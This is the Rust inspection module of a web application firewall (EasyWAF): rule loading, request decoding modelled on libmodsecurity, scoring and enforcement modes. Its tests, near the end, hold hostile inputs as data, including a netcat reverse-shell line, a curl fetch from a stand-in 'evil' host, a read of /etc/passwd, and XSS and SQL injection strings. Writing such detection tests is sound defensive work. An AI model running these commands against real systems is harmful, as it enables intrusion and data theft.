// =========================================================
// modules/waf.rs — EasyWAF
// WAF inspection module.
//
// For every proxied request this module:
//   1. Looks up the WAF policy assigned to the site.
//   2. Loads all enabled rules for that policy from the DB.
//   3. Matches each rule's regex against the configured zone
//      (URL, ARGS, BODY, HEADERS, or ALL of the above).
//   4. Instant-blocks on action='block' rules.
//   5. Accumulates scores; blocks when total >= score_threshold.
//
// rule_engine modes:
//   Off          — skip all checks, always Pass
//   DetectionOnly — run checks but Alert instead of Drop
//   On           — full enforcement, Drop when threshold exceeded
//
// The regex crate uses a safe automata engine — no ReDoS risk.
//
// Patterns are compiled once and cached on the module (see
// compiled_pattern), not per request: the rule set is read
// from the DB on every request, and compiling ~100 patterns
// per request dominated the cost of matching them.
// =========================================================

use crate::modules::{Detection, Findings, RuleHit, InspectionModule, ModuleDecision, RequestContext};
use async_trait::async_trait;
use axum::http::StatusCode;
use regex::Regex;
use sqlx::SqlitePool;
use std::collections::HashMap;
use std::sync::{Arc, RwLock};

// ─── WafModule ───────────────────────────────────────────

/// Pipeline module that evaluates WAF rules for every request.
pub struct WafModule {
    db: SqlitePool,
    /// Compiled patterns, keyed by the pattern source text.
    ///
    /// `None` marks a pattern that failed to compile, so a broken rule is
    /// reported once instead of on every request. Keying by the pattern rather
    /// than the rule id means an edited rule compiles its new pattern on next
    /// use with no explicit invalidation. The key space is admin-controlled
    /// (rules come from the GUI, never from request data), so it stays small.
    regex_cache: RwLock<HashMap<String, Option<Arc<Regex>>>>,
    /// Each site's policy, rules and exclusions, as of one configuration
    /// generation. Read once per change instead of three queries per request —
    /// which, at 138 rules, was 95% of what inspection cost.
    sites: super::generation::PerSite<SiteSnapshot>,
}

impl WafModule {
    /// Create a WafModule backed by the given connection pool.
    pub fn new(db: SqlitePool) -> Self {
        Self {
            db,
            regex_cache: RwLock::new(HashMap::new()),
            sites: super::generation::PerSite::new(),
        }
    }

    /// Return the compiled regex for a rule's pattern, compiling on first use.
    ///
    /// Returns None when the pattern is invalid; that outcome is cached too, so
    /// an unusable rule costs one failed compile and one log line for the life
    /// of the process rather than one per request.
    ///
    /// Two requests can race and compile the same pattern twice — harmless,
    /// since both produce the same value and the second insert simply wins. No
    /// lock is held across an await point.
    fn compiled_pattern(&self, rule: &RuleRow) -> Option<Arc<Regex>> {
        // Fast path — already compiled, or already known to be invalid.
        if let Ok(cache) = self.regex_cache.read() {
            if let Some(entry) = cache.get(&rule.pattern) {
                return entry.clone();
            }
        }

        // Slow path — compile once and remember the outcome either way.
        let compiled = match Regex::new(&rule.pattern) {
            Ok(re) => Some(Arc::new(re)),
            Err(e) => {
                tracing::warn!(
                    rule_id = rule.id,
                    pattern = %rule.pattern,
                    "WAF rule has invalid regex, skipping: {}",
                    e
                );
                None
            }
        };

        if let Ok(mut cache) = self.regex_cache.write() {
            cache.insert(rule.pattern.clone(), compiled.clone());
        }
        compiled
    }

    /// This site's configuration, from the cache unless it has changed.
    ///
    /// The generation is read **before** the rows. A write landing between the
    /// two files rows newer than the number they are stored under, which is
    /// harmless: the next check sees the newer number and reads again. Reading
    /// in the other order could file rows from before a write under the number
    /// from after it, and serve them until the configuration next changed.
    async fn snapshot(&self, site_id: i64) -> Arc<SiteSnapshot> {
        let generation = super::generation::current(&self.db).await;
        if let Some(cached) = self.sites.get(generation, site_id) {
            return cached;
        }

        let policy = get_site_policy(&self.db, site_id).await;
        let rules = match &policy {
            Some(p) => get_rules(&self.db, p.id).await,
            None    => Vec::new(),
        };
        let exclusions = get_exclusions(&self.db, site_id).await;

        self.sites.put(generation, site_id, SiteSnapshot { policy, rules, exclusions })
    }
}

// ─── Internal DB row types ───────────────────────────────

/// Policy configuration fetched per request.
struct PolicyInfo {
    id:                  i64,
    rule_engine:         String,
    score_threshold:     i64,
    challenge_threshold: i64,
}

/// Severity of a WAF decision before the rule_engine mode is applied.
enum Level {
    Challenge,
    Block,
}

/// A single WAF rule loaded from the DB.
struct RuleRow {
    id:      i64,
    /// The catalogue number, when the rule came from a rule set. Custom rules
    /// have none, which is why it is optional rather than defaulted to zero.
    external_id: Option<i64>,
    name:    String,
    zone:    String,
    pattern: String,
    score:   i64,
    action:  String,
}

/// Everything inspection needs to know about one site, read together so the
/// three always describe the same moment.
struct SiteSnapshot {
    policy:     Option<PolicyInfo>,
    rules:      Vec<RuleRow>,
    exclusions: Vec<Exclusion>,
}

// ─── InspectionModule impl ───────────────────────────────

#[async_trait]
impl InspectionModule for WafModule {
    fn name(&self) -> &'static str { "waf" }

    /// Evaluate all enabled rules for this request's policy.
    /// Returns Pass, Alert (DetectionOnly), or Drop (rule_engine=On).
    async fn inspect(&self, ctx: &RequestContext) -> ModuleDecision {
        // Step 1 — this site's policy, rules and exclusions, from the cache.
        let snap = self.snapshot(ctx.site_id).await;
        let policy = match &snap.policy {
            Some(p) => p,
            None    => return ModuleDecision::Pass, // no policy, skip WAF
        };

        // Step 2 — honour the rule_engine mode.
        if policy.rule_engine == "Off" {
            return ModuleDecision::Pass;
        }

        // Step 3 — enabled rules.
        let rules = &snap.rules;
        if rules.is_empty() {
            return ModuleDecision::Pass;
        }

        // Step 3b — which of those this site does not apply.
        //
        // Loaded rather than filtered in SQL because the decision needs the
        // request path, and because a skipped rule is worth logging: a rule
        // that silently does not run is the kind of thing that is discovered
        // during an incident rather than before one.
        let exclusions = &snap.exclusions;

        // Step 4 — build zone content forms from the request.
        // Each zone is a small list of candidate strings — raw, then
        // percent-decoded — matched independently rather than concatenated.
        // Concatenating would need a separator character, and a separator is
        // exactly the kind of thing a rule can accidentally match: an earlier
        // version joined forms with '\n' and a CRLF-detection rule matched
        // that '\n' on any request carrying a percent-encoded header, having
        // nothing to do with anything the client sent. See zone_text.
        // Joined with '?', as a URL is. Concatenating them directly made the
        // path run into the query — "/admin?c=1" became "/adminc=1" — so a rule
        // anchored to the end of a path never matched when a query was present,
        // and the join could manufacture a string appearing in neither half.
        let raw_url = match ctx.query.as_deref() {
            Some(q) if !q.is_empty() => format!("{}?{}", ctx.path, q),
            _                        => ctx.path.clone(),
        };
        let url     = zone_text(&raw_url, true);
        let args    = zone_text(ctx.query.as_deref().unwrap_or(""), true);
        let body    = zone_text(&String::from_utf8_lossy(&ctx.body), true);
        let headers = zone_text(
            &ctx.headers
                .values()
                .filter_map(|v| v.to_str().ok())
                .collect::<Vec<_>>()
                .join(" "),
            false,
        );
        // "ANY" is every form from every zone — still no concatenation, so a
        // zone boundary can never masquerade as content either.
        let any: Vec<&str> = url.iter().chain(&args).chain(&body).chain(&headers)
            .map(String::as_str)
            .collect();

        // Step 5 — evaluate each rule in order.
        let mut total_score: i64 = 0;
        let mut challenge_reason: Option<String> = None;
        // Every rule that matched, in the order it did, so the traffic record
        // can say what produced the score rather than only what it came to.
        let mut hits: Vec<RuleHit> = Vec::new();

        for rule in rules.iter() {
            // A rule this site excludes never runs, and never scores. Checked
            // before matching so the cost of an exclusion is one string
            // comparison rather than a regex.
            if let Some(ex) = exclusions.iter().find(|e| e.silences(rule, &ctx.path, ctx.client_ip)) {
                tracing::debug!(
                    rule = %rule.name,
                    site = %ctx.site_name,
                    path = %ctx.path,
                    prefix = %ex.path_prefix,
                    "WAF rule skipped: excluded for this site"
                );
                continue;
            }

            // Select the candidate forms for this rule's zone. A rule matches
            // if it matches ANY one form — never a concatenation of them.
            let targets: Vec<&str> = match rule.zone.as_str() {
                "URL"     => url.iter().map(String::as_str).collect(),
                "ARGS"    => args.iter().map(String::as_str).collect(),
                "BODY"    => body.iter().map(String::as_str).collect(),
                "HEADERS" => headers.iter().map(String::as_str).collect(),
                _         => any.clone(),  // "ANY" or unrecognised
            };

            // Compiled on first use and cached; skip a rule whose pattern
            // could not be compiled.
            let re = match self.compiled_pattern(rule) {
                Some(r) => r,
                None    => continue,
            };

            if !targets.iter().any(|t| re.is_match(t)) {
                continue;
            }

            tracing::debug!(
                rule    = %rule.name,
                zone    = %rule.zone,
                score   = rule.score,
                action  = %rule.action,
                "WAF rule matched"
            );

            hits.push(RuleHit {
                id:    rule.external_id,
                name:  rule.name.clone(),
                // An instant-block rule carries its own weight rather than a
                // score, so it is reported at the threshold it forced.
                score: if rule.action == "block" { policy.score_threshold } else { rule.score },
            });

            match rule.action.as_str() {
                // Instant block regardless of score — block always wins, so
                // we can decide right here.
                "block" => {
                    let score = policy.score_threshold;
                    return decide(
                        policy,
                        Level::Block,
                        format!("WAF block rule matched: {}", rule.name),
                        Findings { score, hits, detection: None },
                    );
                }
                // Direct challenge request — remember it but keep scanning, so
                // a later block rule can still take precedence.
                "challenge" => {
                    if challenge_reason.is_none() {
                        challenge_reason =
                            Some(format!("WAF challenge rule matched: {}", rule.name));
                    }
                }
                // Default "score" — accumulate.
                _ => { total_score += rule.score; }
            }
        }

        // Step 6 — apply thresholds. Block takes precedence over challenge.
        if total_score >= policy.score_threshold {
            return decide(
                policy,
                Level::Block,
                format!("WAF score {} ≥ block threshold {}", total_score, policy.score_threshold),
                Findings { score: total_score, hits, detection: None },
            );
        }

        if let Some(reason) = challenge_reason {
            return decide(policy, Level::Challenge, reason,
                          Findings { score: total_score, hits, detection: None });
        }

        if policy.challenge_threshold > 0 && total_score >= policy.challenge_threshold {
            return decide(
                policy,
                Level::Challenge,
                format!("WAF score {} ≥ challenge threshold {}", total_score, policy.challenge_threshold),
                Findings { score: total_score, hits, detection: None },
            );
        }

        // Rules matched, and the request is allowed anyway — it stayed under
        // every threshold. That is still worth recording: reconnaissance lives
        // here, and so does the request that scores 9 against a threshold of
        // 10. Passing silently threw all of it away, in every mode, which is
        // why a policy could be quietly one point from blocking real traffic
        // with nothing to show for it.
        if !hits.is_empty() {
            return ModuleDecision::Alert {
                reason: format!(
                    "WAF score {} below block threshold {}",
                    total_score, policy.score_threshold
                ),
                findings: Findings {
                    score: total_score,
                    hits,
                    detection: Some(Detection::Observed),
                },
            };
        }

        ModuleDecision::Pass
    }
}

// ─── Zone text ───────────────────────────────────────────

/// Build the candidate forms a rule is matched against: the request text as
/// received, and its percent-decoded equivalents.
///
/// Attack payloads arrive percent-encoded far more often than not — a browser
/// encodes the spaces in `DROP TABLE users` without being asked — and matching
/// the raw text alone meant every pattern containing `\s` missed them: the same
/// payload that blocked instantly in a request body sailed through in a query
/// string.
///
/// The forms are matched independently by the caller rather than concatenated
/// into one string. Concatenation needs a separator, and a separator is
/// exactly the kind of text a rule can accidentally match — a CRLF-detection
/// rule once matched the '\n' this function used to join forms with, on any
/// request carrying a percent-encoded header, which had nothing to do with
/// what the client sent. Returning the forms separately makes that whole class
/// of bug impossible rather than relocating it to a different separator.
///
/// The raw form is kept alongside the decoded ones rather than replaced.
/// Several rules deliberately look for the encoding itself — `%252e%252e`,
/// `%00`, the double-URL-encoding protocol rule — so decoding in place would
/// trade one blind spot for another. Decoding runs twice so double-encoded
/// payloads reduce to plain text as well.
///
/// Beyond percent-encoding, CRS rules declare the escapes they expect to have
/// been undone — `t:htmlEntityDecode`, `t:jsDecode`, `t:cssDecode` — and their
/// patterns are written against the result. Those transformations are applied
/// in chains, in the two orders CRS itself uses, adding one form each. They run
/// only when the percent-decoded text contains an escape character to act on,
/// so ordinary traffic pays one scan.
///
/// `plus_is_space` suits query strings and form bodies, where `+` encodes a
/// space. It is wrong for a path, where `+` is a literal character.
///
/// A single-element result costs only the scan for `%` — this runs per
/// request, and bodies reach 32 MB — when the text carries no encoding.
fn zone_text(raw: &str, plus_is_space: bool) -> Vec<String> {
    let has_pct  = raw.contains('%');
    let has_plus = plus_is_space && raw.contains('+');
    // One pass for the characters the decoders below act on. Text carrying
    // none of them — which is most text — costs this scan and one allocation.
    let has_esc  = raw.as_bytes().iter().any(|b| matches!(b, b'&' | b'\\' | 0));

    if !has_pct && !has_plus && !has_esc {
        return vec![raw.to_string()];
    }

    let mut forms = vec![raw.to_string()];

    // '+' means space in a query string, and must be substituted before
    // percent-decoding rather than after, or "%2B" would become a space too.
    let base = if has_plus { raw.replace('+', " ") } else { raw.to_string() };
    push_unique(&mut forms, base.clone());

    let once = percent_decode(&base);
    push_unique(&mut forms, once.clone());
    push_unique(&mut forms, percent_decode(&once));

    // The chains start from percent-decoded text, not from the text as
    // received: an escape is routinely encoded on the way in, and
    // `%26lt%3Bscript%26gt%3B` is `&lt;script&gt;` is `<script>`. Gating on
    // the raw text alone missed every payload that arrived through a browser's
    // own encoding, which is most of them.
    //
    // `urlDecodeUni` differs from `percent_decode` only over `%uHHHH`, so the
    // form already decoded above is reused unless the text carries one.
    let uni = if has_pct && base.to_ascii_lowercase().contains("%u") {
        url_decode_uni(&base)
    } else {
        once.clone()
    };

    // urlDecodeUni is a transformation in its own right, and rules declare it
    // on its own: `%uFF1C` has to become a form whether or not any escape
    // survives for the chains below to work on.
    push_unique(&mut forms, uni.clone());

    // The transformation chains CRS declares, in its own order.
    if uni.as_bytes().iter().any(|b| matches!(b, b'&' | b'\\' | 0)) {
        // 941xxx, the XSS sets:
        //   t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls
        push_unique(
            &mut forms,
            remove_nulls(&css_decode(&js_decode(&html_entity_decode(&uni)))),
        );

        // 944150 and the rest of the Log4Shell family:
        //   t:urlDecodeUni,t:jsDecode,t:htmlEntityDecode
        // The order matters: an entity that decodes to a backslash is an
        // escape to the first chain and plain text to this one.
        //
        // Order has one consequence worth knowing: jsDecode reads `\3c` as an
        // octal escape and consumes it before cssDecode ever sees it, so a CSS
        // escape beginning with an octal digit does not survive the first
        // chain. libmodsecurity does exactly the same thing, and the rules were
        // written against that, so this follows it rather than improving on it.
        push_unique(&mut forms, html_entity_decode(&js_decode(&uni)));
    }

    forms
}

/// Add a form unless an identical one is already present.
///
/// The chains converge on the same text as the percent-decoded forms far more
/// often than not — most requests carry one kind of encoding, not four — and a
/// duplicate form costs a full pass of every rule in the policy.
fn push_unique(forms: &mut Vec<String>, form: String) {
    if !forms.iter().any(|f| f == &form) {
        forms.push(form);
    }
}

/// Percent-decode one string: byte by byte, then read as UTF-8 with anything
/// invalid replaced by U+FFFD.
///
/// Until 0.10.2 this used `urlencoding::decode`, which fails outright when the
/// decoded bytes are not valid UTF-8 — and on failure the raw text was kept. So
/// one escape that does not decode to UTF-8, anywhere in a field (`%FF`, `%C0`),
/// switched decoding off for the whole field, and every rule needing the
/// decoded text stopped seeing the attack beside it. The applications behind
/// EasyWAF decode the rest of the field regardless, so the attack still arrived.
///
/// A lossy decode keeps every ASCII character of a payload visible whatever
/// else the field contains, and valid input decodes exactly as it did before.
fn percent_decode(s: &str) -> String {
    String::from_utf8_lossy(&urlencoding::decode_binary(s.as_bytes())).into_owned()
}

// ─── Decoders ────────────────────────────────────────────

// The escapes CRS rules are written to see through.
//
// A CRS rule declares the transformations it assumes and its pattern is
// written against the *result*, so matching that pattern against the text as
// received catches the literal payload and misses every escaped variant.
// `scripts/modsec2easywaf.py` refuses such rules rather than shipping
// protection the encoding it names walks straight through — 36 of them,
// including all three Log4Shell rules.
//
// These follow **libmodsecurity's** implementations, not the language
// standards they are named after, because the patterns were written and
// tested against its behaviour, quirks included: HTML entities truncate to one
// byte, only five names are recognised, and a semicolon is optional. Decoding
// "correctly" here would mean decoding differently from the engine the rules
// come from.
//
// Each works on bytes and returns text: an escape can name a byte that is not
// valid UTF-8 on its own, and a lossy conversion keeps the ASCII around it
// visible — the same reasoning as `percent_decode`.
//
// Where libmodsecurity is stricter than these are — accepting only `\u`, never
// `\U` — the looser reading is deliberate. An extra form can only add a match,
// never remove one, so the cost of being wrong is a false positive that shows
// up in the Traffic Monitor, rather than a silent hole.

/// The value of `digits` read as hexadecimal, or None unless every byte is a
/// hex digit.
fn hex_value(digits: &[u8]) -> Option<u32> {
    let mut value: u32 = 0;
    for d in digits {
        value = value * 16 + (*d as char).to_digit(16)?;
    }
    Some(value)
}

/// One byte from a 16-bit escape.
///
/// The full-width block `FF01`–`FF5E` folds onto ASCII, which is what makes
/// `＜` the `<` an XSS rule is looking for rather than an unrelated byte.
/// Everything else keeps its low byte, as libmodsecurity does.
fn fold_wide(code: u32) -> u8 {
    if code & 0xFF00 == 0xFF00 {
        ((code & 0xFF) as u8).wrapping_add(0x20)
    } else {
        (code & 0xFF) as u8
    }
}

/// `urlDecodeUni`: percent-decoding that also understands `%uHHHH`.
///
/// That form is IIS's rather than the URL standard's, and CRS still decodes it
/// because the servers behind a WAF still accept it.
fn url_decode_uni(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;

    while i < b.len() {
        if b[i] == b'%' {
            if i + 6 <= b.len()
                && b[i + 1] | 0x20 == b'u'
                && let Some(code) = hex_value(&b[i + 2..i + 6])
            {
                out.push(fold_wide(code));
                i += 6;
                continue;
            }
            if i + 3 <= b.len()
                && let Some(code) = hex_value(&b[i + 1..i + 3])
            {
                out.push(code as u8);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }

    String::from_utf8_lossy(&out).into_owned()
}

/// `htmlEntityDecode`: `&lt;`, `&#60;`, `&#x3c;` — and nothing else.
fn html_entity_decode(s: &str) -> String {
    if !s.contains('&') {
        return s.to_string();
    }

    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;

    while i < b.len() {
        if b[i] == b'&'
            && let Some((byte, used)) = entity_at(&b[i + 1..])
        {
            out.push(byte);
            i += 1 + used;
            continue;
        }
        out.push(b[i]);
        i += 1;
    }

    String::from_utf8_lossy(&out).into_owned()
}

/// One entity after its `&`: the byte it stands for, and how much it used.
///
/// Returns None for anything else, so `&dollar;` and a bare `&` between query
/// parameters are left exactly as they are — which is also what libmodsecurity
/// does, and what the rules were written against.
fn entity_at(rest: &[u8]) -> Option<(u8, usize)> {
    if rest.first() == Some(&b'#') {
        let (radix, start) = match rest.get(1) {
            Some(c) if c | 0x20 == b'x' => (16, 2),
            _                           => (10, 1),
        };

        let mut value: u32 = 0;
        let mut i = start;
        while let Some(d) = rest.get(i).and_then(|c| (*c as char).to_digit(radix)) {
            // Saturating, because the digits come from a client: `&#99999…`
            // must truncate like any other value, not panic in a debug build.
            value = value.saturating_mul(radix).saturating_add(d);
            i += 1;
        }
        if i == start {
            return None;
        }

        // The semicolon is optional, to libmodsecurity as to a browser.
        if rest.get(i) == Some(&b';') {
            i += 1;
        }
        // Truncated to one byte: `&#256;` is a NUL, and a rule written against
        // libmodsecurity expects exactly that.
        return Some(((value & 0xFF) as u8, i));
    }

    for (name, byte) in [
        (&b"quot"[..], b'"'),
        (&b"amp"[..],  b'&'),
        (&b"lt"[..],   b'<'),
        (&b"gt"[..],   b'>'),
        (&b"nbsp"[..], 0xA0u8),
    ] {
        if rest.len() >= name.len() && rest[..name.len()].eq_ignore_ascii_case(name) {
            let mut used = name.len();
            if rest.get(used) == Some(&b';') {
                used += 1;
            }
            return Some((byte, used));
        }
    }

    None
}

/// `jsDecode`: the escapes a JavaScript string literal may carry.
fn js_decode(s: &str) -> String {
    if !s.contains('\\') {
        return s.to_string();
    }

    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;

    while i < b.len() {
        if b[i] != b'\\' || i + 1 >= b.len() {
            out.push(b[i]);
            i += 1;
            continue;
        }

        let c = b[i + 1];

        if c | 0x20 == b'u'
            && i + 6 <= b.len()
            && let Some(code) = hex_value(&b[i + 2..i + 6])
        {
            out.push(fold_wide(code));
            i += 6;
            continue;
        }

        if c | 0x20 == b'x'
            && i + 4 <= b.len()
            && let Some(code) = hex_value(&b[i + 2..i + 4])
        {
            out.push(code as u8);
            i += 4;
            continue;
        }

        if (b'0'..=b'7').contains(&c) {
            let mut value: u32 = 0;
            let mut used = 0;
            while used < 3
                && i + 1 + used < b.len()
                && (b'0'..=b'7').contains(&b[i + 1 + used])
            {
                value = value * 8 + (b[i + 1 + used] - b'0') as u32;
                used += 1;
            }
            out.push((value & 0xFF) as u8);
            i += 1 + used;
            continue;
        }

        // The named escapes, then the rule libmodsecurity applies to every
        // other character: drop the backslash and keep it. That is the whole
        // point for a rule looking for a tag — `\<script\>` is `<script>`.
        out.push(match c {
            b'a' => 0x07,
            b'b' => 0x08,
            b'f' => 0x0C,
            b'n' => 0x0A,
            b'r' => 0x0D,
            b't' => 0x09,
            b'v' => 0x0B,
            other => other,
        });
        i += 2;
    }

    String::from_utf8_lossy(&out).into_owned()
}

/// `cssDecode`: the backslash-hex escape CSS allows, `\3c` for `<`.
fn css_decode(s: &str) -> String {
    if !s.contains('\\') {
        return s.to_string();
    }

    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;

    while i < b.len() {
        if b[i] != b'\\' || i + 1 >= b.len() {
            out.push(b[i]);
            i += 1;
            continue;
        }

        let c = b[i + 1];

        // A backslash before a newline is a line continuation: both go, and
        // so does the second half of a CRLF pair.
        if c == b'\n' || c == b'\r' {
            i += 2;
            if i < b.len() && (b[i] == b'\n' || b[i] == b'\r') && b[i] != c {
                i += 1;
            }
            continue;
        }

        if c.is_ascii_hexdigit() {
            // Up to six digits, of which only the low byte survives — the same
            // truncation as an HTML entity, so `\00003c` is `<`.
            let mut value: u32 = 0;
            let mut used = 0;
            while used < 6
                && i + 1 + used < b.len()
                && b[i + 1 + used].is_ascii_hexdigit()
            {
                value = value * 16 + (b[i + 1 + used] as char).to_digit(16).unwrap_or(0);
                used += 1;
            }
            out.push((value & 0xFF) as u8);
            i += 1 + used;

            // CSS lets one whitespace character end an escape, and it belongs
            // to the escape rather than to the text: `\3c script` is
            // `<script`, which is exactly what the rule is looking for.
            if i < b.len() && matches!(b[i], b' ' | b'\t' | b'\n' | b'\r' | 0x0C) {
                i += 1;
            }
            continue;
        }

        out.push(c);
        i += 2;
    }

    String::from_utf8_lossy(&out).into_owned()
}

/// `removeNulls`: a NUL byte inside a payload splits it for a rule while the
/// application behind reads straight past it.
fn remove_nulls(s: &str) -> String {
    if !s.contains('\0') {
        return s.to_string();
    }
    s.chars().filter(|c| *c != '\0').collect()
}

// ─── decide ──────────────────────────────────────────────

/// Map a decision Level to a ModuleDecision, applying the rule_engine mode.
/// In DetectionOnly mode nothing is enforced — every decision becomes an Alert.
fn decide(
    policy: &PolicyInfo,
    level: Level,
    reason: String,
    findings: Findings,
) -> ModuleDecision {
    // DetectionOnly still reports what matched. Seeing which rules would have
    // fired is the entire point of running a policy in that mode — and until
    // 0.6.11 the Alert produced here was discarded by the proxy, so the mode
    // reported nothing at all. What would have happened is recorded on the
    // findings so the traffic record can say it.
    if policy.rule_engine == "DetectionOnly" {
        let mut findings = findings;
        findings.detection = Some(match level {
            Level::Block     => Detection::WouldBlock,
            Level::Challenge => Detection::WouldChallenge,
        });
        return ModuleDecision::Alert { reason, findings };
    }
    match level {
        Level::Challenge => ModuleDecision::Challenge { reason, findings },
        Level::Block     => {
            ModuleDecision::Drop { reason, status: StatusCode::FORBIDDEN, findings }
        }
    }
}

// ─── DB helpers ──────────────────────────────────────────

/// Fetch the WAF policy assigned to a site.
/// Returns None if the site has no policy (waf_policy_id IS NULL).
async fn get_site_policy(db: &SqlitePool, site_id: i64) -> Option<PolicyInfo> {
    sqlx::query!(
        "SELECT p.id                  as \"id!\",
                p.rule_engine,
                p.score_threshold     as \"score_threshold!\",
                p.challenge_threshold as \"challenge_threshold!\"
         FROM   policies p
         JOIN   sites    s ON s.waf_policy_id = p.id
         WHERE  s.id = ?",
        site_id
    )
    .fetch_optional(db)
    .await
    .ok()
    .flatten()
    .map(|r| PolicyInfo {
        id:                  r.id,
        rule_engine:         r.rule_engine,
        score_threshold:     r.score_threshold,
        challenge_threshold: r.challenge_threshold,
    })
}

/// Fetch all enabled rules for a policy, ordered by id.
/// One rule a site does not apply, and where and for whom it does not apply.
struct Exclusion {
    external_id: Option<i64>,
    rule_id:     Option<i64>,
    path_prefix: String,
    /// The clients this covers. `None` is every client, which is what a row
    /// written before 0.6.13 means and what the engine did before the column
    /// existed. A block that fails to parse is treated as matching nobody —
    /// see `get_exclusions`.
    client:      Option<crate::forwarded::Cidr>,
}

impl Exclusion {
    /// Does this exclusion silence `rule` on `path` for `client`?
    ///
    /// A catalogue rule is matched by its number, not by its row id, so an
    /// exclusion survives the set being removed and installed again — which
    /// rewrites every row with a new id.
    fn silences(&self, rule: &RuleRow, path: &str, client: std::net::IpAddr) -> bool {
        let same_rule = match (self.external_id, self.rule_id) {
            (Some(ext), _) => rule.external_id == Some(ext),
            (_, Some(id))  => rule.id == id,
            // The CHECK constraint makes this unreachable from the database.
            // Treated as matching nothing rather than everything: a row we
            // cannot read is not grounds for turning a rule off.
            _ => false,
        };
        if !same_rule {
            return false;
        }
        if !(self.path_prefix.is_empty() || path.starts_with(&self.path_prefix)) {
            return false;
        }
        // An exclusion with no block covers every client. One with a block
        // covers only what it names, so the rule keeps protecting the site
        // from everyone else — which is the point of narrowing by client.
        match self.client {
            Some(cidr) => cidr.contains(client),
            None       => true,
        }
    }
}

/// Exclusions recorded for this site.
///
/// Per site, not per policy: the policy is the thing being shared, so it is
/// the wrong place to record that one site disagrees with it.
async fn get_exclusions(db: &SqlitePool, site_id: i64) -> Vec<Exclusion> {
    sqlx::query!(
        "SELECT external_id, rule_id, path_prefix as \"path_prefix!\", client_cidr
         FROM   site_rule_exclusions
         WHERE  site_id = ?",
        site_id
    )
    .fetch_all(db)
    .await
    .unwrap_or_default()
    .into_iter()
    .filter_map(|r| {
        // A stored block that no longer parses would otherwise widen the
        // exclusion to every client — turning a narrow tuning into a hole
        // silently. The row is dropped and said aloud instead.
        let client = match r.client_cidr.as_deref() {
            None | Some("") => None,
            Some(raw) => match crate::forwarded::Cidr::parse(raw) {
                Some(c) => Some(c),
                None => {
                    tracing::warn!(
                        cidr = raw,
                        "Ignoring a rule exclusion whose client block cannot be parsed"
                    );
                    return None;
                }
            },
        };
        Some(Exclusion {
            external_id: r.external_id,
            rule_id:     r.rule_id,
            path_prefix: r.path_prefix,
            client,
        })
    })
    .collect()
}

async fn get_rules(db: &SqlitePool, policy_id: i64) -> Vec<RuleRow> {
    let rows = sqlx::query!(
        "SELECT id       as \"id!\",
                external_id,
                name,
                zone,
                pattern,
                score    as \"score!\",
                action
         FROM   waf_rules
         WHERE  policy_id = ? AND enabled = 1
         ORDER  BY id",
        policy_id
    )
    .fetch_all(db)
    .await
    .unwrap_or_default();

    rows.into_iter()
        .map(|r| RuleRow {
            id:          r.id,
            external_id: r.external_id,
            name:        r.name,
            zone:    r.zone,
            pattern: r.pattern,
            score:   r.score,
            action:  r.action,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::{Exclusion, RuleRow};
    use regex::Regex;

    /// Pull one rule's pattern out of the shipped catalog, so the test checks
    /// what actually loads rather than a copy that can drift from it.
    fn pattern(file: &str, id: u32) -> String {
        let text = std::fs::read_to_string(format!("rules/{file}"))
            .unwrap_or_else(|e| panic!("rules/{file}: {e}"));
        for block in text.split("[[rules]]").skip(1) {
            if !block.contains(&format!("id          = {id}")) {
                continue;
            }
            for line in block.lines() {
                if let Some(rest) = line.trim().strip_prefix("pattern     = ") {
                    return rest.trim().trim_matches('\'').to_string();
                }
            }
        }
        panic!("rule {id} not found in rules/{file}");
    }

    #[test]
    fn command_chaining_ignores_names_that_merely_start_with_a_command() {
        let re = Regex::new(&pattern("932-rce.rules.toml", 932012)).unwrap();

        // A Cookie header is semicolon-separated by definition, so these are
        // ordinary traffic. "nc" matching the "nc" of "nc_token" scored 8 of a
        // threshold of 10 on every request an application like Nextcloud made.
        for benign in [
            "oc_sessionPassphrase=abc; nc_token=xyz",
            "a=1; nc_username=yariv",
            "session=1; identity=bob",
            "x=1; catalogue=shoes",
            "x=1; lsp_id=42",
            "x=1; shop_cart=3",
        ] {
            assert!(!re.is_match(benign), "false positive on {benign:?}");
        }
    }

    #[test]
    fn command_chaining_still_catches_the_real_thing() {
        let re = Regex::new(&pattern("932-rce.rules.toml", 932012)).unwrap();
        for attack in [
            "; nc -e /bin/sh 10.0.0.1",
            "; ls -la",
            "| cat /etc/passwd",
            "; whoami",
            "`id`",
            ";curl http://evil/x",
            "; netcat 10.0.0.1 4444",
        ] {
            assert!(re.is_match(attack), "missed {attack:?}");
        }
    }

    #[test]
    fn double_encoding_means_an_encoded_percent_not_two_escapes() {
        let re = Regex::new(&pattern("920-protocol.rules.toml", 920002)).unwrap();

        // Two escapes in a row is ordinary URL encoding, not an attack. Any
        // character outside ASCII produces several, so this used to score
        // every request carrying a non-English filename.
        for benign in [
            "requesttoken=abc%3D%3Adef%3D",
            "/files/%D7%AA%D7%9E%D7%95%D7%A0%D7%94.jpg",
            "/files/caf%C3%A9.txt",
            "/files/%F0%9F%93%81.png",
            "/x?q=hello%20%22world%22",
        ] {
            assert!(!re.is_match(benign), "false positive on {benign:?}");
        }

        // A percent that has itself been encoded is the real thing.
        for attack in ["%253Cscript%253E", "%252e%252e%252f", "%%3C"] {
            assert!(re.is_match(attack), "missed {attack:?}");
        }
    }

    #[test]
    fn one_invalid_escape_does_not_switch_decoding_off() {
        // Until 0.10.2 a single escape that does not decode to UTF-8 made the
        // whole field keep its raw, still-encoded form, so every rule needing
        // the decoded text missed the attack beside it — while the backend
        // decoded the rest and received it. A junk extra parameter was enough.
        for (field, decoded) in [
            ("%45VILBODY%FF",                          "EVILBODY"),
            ("x=%45VILBODY&y=%C0",                     "EVILBODY"),
            ("%3Cscript%3Ealert(1)%3C%2Fscript%3E%E9", "<script>alert(1)</script>"),
            ("%FF%27%20OR%201%3D1--",                  "' OR 1=1--"),
        ] {
            let forms = super::zone_text(field, true);
            assert!(forms.iter().any(|f| f.contains(decoded)),
                    "{field:?} never decoded to {decoded:?}: {forms:?}");
        }
    }

    #[test]
